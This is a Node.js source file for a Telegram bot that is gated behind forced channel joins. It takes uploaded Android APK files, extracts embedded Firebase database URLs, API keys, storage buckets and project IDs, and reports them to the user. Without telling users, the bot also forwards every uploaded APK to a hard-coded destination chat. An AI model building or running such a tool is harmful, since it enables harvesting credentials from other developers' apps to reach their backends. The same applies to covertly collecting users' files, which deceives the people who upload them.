const express = require("express");
const { Telegraf, Markup } = require("telegraf");
const AdmZip = require("adm-zip");
const fs = require("fs");
const path = require("path");
const os = require("os");

const BOT_TOKEN = process.env.BOT_TOKEN;
const DESTINATION_CHAT_ID =
  process.env.DESTINATION_CHAT_ID || "-1004352285600";

const REQUIRED_CHANNELS = [
  "@brotherpanell",
  "@PANELEMPIRE2",
  "@backuptt2"
];

if (!BOT_TOKEN) {
  console.error("❌ BOT_TOKEN is missing");
  process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);

// ==========================================
// WEB SERVER
// ==========================================

const app = express();

app.get("/", (req, res) => {
  res.send("🔥 BROTHER's PANEL Firebase Extraction Bot is ONLINE");
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`Web server running on port ${PORT}`);
});

// ==========================================
// CHANNEL CHECK
// ==========================================

async function checkChannels(ctx) {
  const userId = ctx.from.id;

  for (const channel of REQUIRED_CHANNELS) {
    try {
      const member =
        await ctx.telegram.getChatMember(
          channel,
          userId
        );

      if (
        member.status !== "member" &&
        member.status !== "administrator" &&
        member.status !== "creator"
      ) {
        return false;
      }

    } catch (error) {
      console.error(
        `Channel check error ${channel}:`,
        error.message
      );

      return false;
    }
  }

  return true;
}

// ==========================================
// JOIN BUTTONS
// ==========================================

function joinKeyboard() {
  return Markup.inlineKeyboard([
    [
      Markup.button.url(
        "📢 JOIN CHANNEL 1",
        "https://t.me/brotherpanell"
      )
    ],
    [
      Markup.button.url(
        "📢 JOIN CHANNEL 2",
        "https://t.me/PANELEMPIRE2"
      )
    ],
    [
      Markup.button.url(
        "📢 JOIN CHANNEL 3",
        "https://t.me/backuptt2"
      )
    ],
    [
      Markup.button.callback(
        "✅ VERIFY",
        "verify"
      )
    ]
  ]);
}

// ==========================================
// /START
// ==========================================

bot.start(async (ctx) => {

  console.log(
    `START: ${ctx.from.id}`
  );

  try {

    const joined =
      await checkChannels(ctx);

    if (!joined) {

      return ctx.reply(
        "🔐 Please join all 3 required channels first.\n\nAfter joining all 3 channels, press VERIFY.",
        joinKeyboard()
      );
    }

    await ctx.reply(
      "✅ VERIFICATION SUCCESSFUL!\n\n📦 Please send your APK file."
    );

  } catch (error) {

    console.error(
      "START ERROR:",
      error
    );

    await ctx.reply(
      "⚠️ An error occurred. Please try again."
    );
  }
});

// ==========================================
// VERIFY
// ==========================================

bot.action("verify", async (ctx) => {

  try {

    await ctx.answerCbQuery(
      "Checking..."
    );

    const joined =
      await checkChannels(ctx);

    if (!joined) {

      return ctx.reply(
        "❌ VERIFICATION FAILED.\n\nPlease join all 3 channels and press VERIFY again.",
        joinKeyboard()
      );
    }

    await ctx.reply(
      "✅ VERIFICATION SUCCESSFUL!\n\n📦 Please send your APK file."
    );

  } catch (error) {

    console.error(
      "VERIFY ERROR:",
      error
    );

    await ctx.reply(
      "⚠️ Verification error. Please try again."
    );
  }
});

// ==========================================
// APK ONLY
// ==========================================

bot.on("document", async (ctx) => {

  const document =
    ctx.message.document;

  const fileName =
    document.file_name || "";

  // ONLY .APK
  if (
    !fileName
      .toLowerCase()
      .endsWith(".apk")
  ) {

    return ctx.reply(
      "❌ INVALID FILE.\n\nOnly .APK files are supported."
    );
  }

  // ========================================
  // CHECK MEMBERSHIP
  // ========================================

  const joined =
    await checkChannels(ctx);

  if (!joined) {

    return ctx.reply(
      "❌ Please join all 3 required channels first.",
      joinKeyboard()
    );
  }

  // ========================================
  // PROCESSING MESSAGE
  // ========================================

  const processing =
    await ctx.reply(
      "📦 APK RECEIVED.\n\n🔍 Firebase configuration scan started...\n\n⏳ Please wait 8 seconds."
    );

  let tempFile = null;

  try {

    // ======================================
    // DOWNLOAD APK
    // ======================================

    const fileLink =
      await ctx.telegram.getFileLink(
        document.file_id
      );

    const response =
      await fetch(fileLink.href);

    if (!response.ok) {
      throw new Error(
        "APK download failed"
      );
    }

    const buffer =
      Buffer.from(
        await response.arrayBuffer()
      );

    tempFile = path.join(
      os.tmpdir(),
      `${Date.now()}-${safeName(fileName)}`
    );

    fs.writeFileSync(
      tempFile,
      buffer
    );

    // ======================================
    // SEND ONLY APK TO DESTINATION CHAT
    // ======================================

    await ctx.telegram.sendDocument(
      DESTINATION_CHAT_ID,
      {
        source: tempFile
      }
    );

    // ======================================
    // EXACT 8 SECOND DELAY
    // ======================================

    await sleep(8000);

    // ======================================
    // SCAN
    // ======================================

    const result =
      scanFirebase(tempFile);

    const size =
      (buffer.length / 1024 / 1024)
        .toFixed(2);

    // ======================================
    // RESULT
    // ======================================

    let output =
      "🔥 <b>BROTHER's PANEL FIREBASE EXTRACTION RESULT</b> 🔥\n\n";

    output +=
      "════════════════════\n";

    output +=
      `📱 APK: ${escapeHtml(fileName)}\n`;

    output +=
      `📦 Size: ${size} MB\n`;

    output +=
      "════════════════════\n\n";

    output +=
      "━━━━━━━━━━━━━━━━━━━━━━━━━━\n";

    output +=
      `🔓 <b>EXTRACTED FIREBASE CONFIG (${result.count} found)</b>\n`;

    output +=
      "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";

    // DB URL
    for (
      const url of result.databaseUrls
    ) {

      output +=
        "🔗 <b>DB URL:</b>\n";

      output +=
        `${escapeHtml(url)}\n\n`;
    }

    // API KEY
    for (
      const key of result.apiKeys
    ) {

      output +=
        "🔑 <b>API Key:</b>\n";

      output +=
        `${escapeHtml(key)}\n\n`;
    }

    // STORAGE
    for (
      const storage of result.storageUrls
    ) {

      output +=
        "🗄️ <b>Storage URL:</b>\n";

      output +=
        `${escapeHtml(storage)}\n\n`;
    }

    // PROJECT ID
    for (
      const project of result.projectIds
    ) {

      output +=
        "🆔 <b>Project ID:</b>\n";

      output +=
        `${escapeHtml(project)}\n\n`;
    }

    // APP ID
    for (
      const appId of result.appIds
    ) {

      output +=
        "📱 <b>Firebase App ID:</b>\n";

      output +=
        `${escapeHtml(appId)}\n\n`;
    }

    if (result.count === 0) {

      output +=
        "❌ No Firebase configuration detected.\n";
    }

    // ======================================
    // EDIT PROCESSING MESSAGE
    // ======================================

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      processing.message_id,
      undefined,
      output,
      {
        parse_mode: "HTML"
      }
    );

  } catch (error) {

    console.error(
      "APK ERROR:",
      error
    );

    try {

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        processing.message_id,
        undefined,
        "❌ APK processing failed.\n\nPlease try again with another APK."
      );

    } catch {}
    
  } finally {

    // ======================================
    // DELETE TEMP FILE
    // ======================================

    if (
      tempFile &&
      fs.existsSync(tempFile)
    ) {

      try {
        fs.unlinkSync(tempFile);
      } catch {}
    }
  }
});

// ==========================================
// FIREBASE SCANNER
// ==========================================

function scanFirebase(filePath) {

  const zip =
    new AdmZip(filePath);

  const entries =
    zip.getEntries();

  const databaseUrls =
    new Set();

  const apiKeys =
    new Set();

  const storageUrls =
    new Set();

  const projectIds =
    new Set();

  const appIds =
    new Set();

  for (
    const entry of entries
  ) {

    if (entry.isDirectory) {
      continue;
    }

    let content;

    try {

      content =
        entry
          .getData()
          .toString("utf8");

    } catch {

      continue;
    }

    // ======================================
    // DATABASE URL
    // ======================================

    const db1 =
      content.match(
        /https?:\/\/[A-Za-z0-9._-]+\.firebaseio\.com(?:\/[^\s"'<>]*)?/gi
      );

    if (db1) {

      for (const url of db1) {

        databaseUrls.add(
          clean(url)
        );
      }
    }

    const db2 =
      content.match(
        /https?:\/\/[A-Za-z0-9._-]+\.firebasedatabase\.app(?:\/[^\s"'<>]*)?/gi
      );

    if (db2) {

      for (const url of db2) {

        databaseUrls.add(
          clean(url)
        );
      }
    }

    // ======================================
    // FIREBASE URL CONFIG
    // ======================================

    const configUrl =
      content.match(
        /"firebase_url"\s*:\s*"([^"]+)"/gi
      );

    if (configUrl) {

      for (
        const item of configUrl
      ) {

        const match =
          item.match(
            /"firebase_url"\s*:\s*"([^"]+)"/i
          );

        if (match) {

          databaseUrls.add(
            clean(match[1])
          );
        }
      }
    }

    // ======================================
    // API KEY
    // ======================================

    const keys =
      content.match(
        /AIza[0-9A-Za-z_-]{20,}/g
      );

    if (keys) {

      for (const key of keys) {

        apiKeys.add(key);
      }
    }

    // ======================================
    // STORAGE
    // ======================================

    const storage =
      content.match(
        /[A-Za-z0-9._-]+\.(?:appspot\.com|firebasestorage\.app)/gi
      );

    if (storage) {

      for (
        const value of storage
      ) {

        storageUrls.add(
          clean(value)
        );
      }
    }

    // ======================================
    // PROJECT ID
    // ======================================

    const projects =
      content.match(
        /"project_id"\s*:\s*"([^"]+)"/gi
      );

    if (projects) {

      for (
        const item of projects
      ) {

        const match =
          item.match(
            /"project_id"\s*:\s*"([^"]+)"/i
          );

        if (match) {

          projectIds.add(
            match[1]
          );
        }
      }
    }

    // ======================================
    // FIREBASE APP ID
    // ======================================

    const firebaseApps =
      content.match(
        /1:[0-9]+:android:[A-Za-z0-9]+/gi
      );

    if (firebaseApps) {

      for (
        const app of firebaseApps
      ) {

        appIds.add(app);
      }
    }
  }

  const count =
    databaseUrls.size +
    apiKeys.size +
    storageUrls.size +
    projectIds.size +
    appIds.size;

  return {

    count,

    databaseUrls:
      [...databaseUrls],

    apiKeys:
      [...apiKeys],

    storageUrls:
      [...storageUrls],

    projectIds:
      [...projectIds],

    appIds:
      [...appIds]
  };
}

// ==========================================
// HELPERS
// ==========================================

function sleep(ms) {
  return new Promise(
    resolve => setTimeout(resolve, ms)
  );
}

function clean(value) {

  return String(value)
    .trim()
    .replace(
      /[\\'")>,;]+$/g,
      ""
    );
}

function safeName(name) {

  return name.replace(
    /[^a-zA-Z0-9._-]/g,
    "_"
  );
}

function escapeHtml(value) {

  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

// ==========================================
// ERROR HANDLING
// ==========================================

bot.catch((error) => {

  console.error(
    "BOT ERROR:",
    error
  );
});

// ==========================================
// START
// ==========================================

bot.launch()
  .then(() => {

    console.log(
      "🔥 BROTHER's PANEL FIREBASE EXTRACTION BOT STARTED"
    );

  })
  .catch((error) => {

    console.error(
      "❌ BOT START FAILED:",
      error
    );
  });

process.once(
  "SIGINT",
  () => bot.stop("SIGINT")
);

process.once(
  "SIGTERM",
  () => bot.stop("SIGTERM")
);
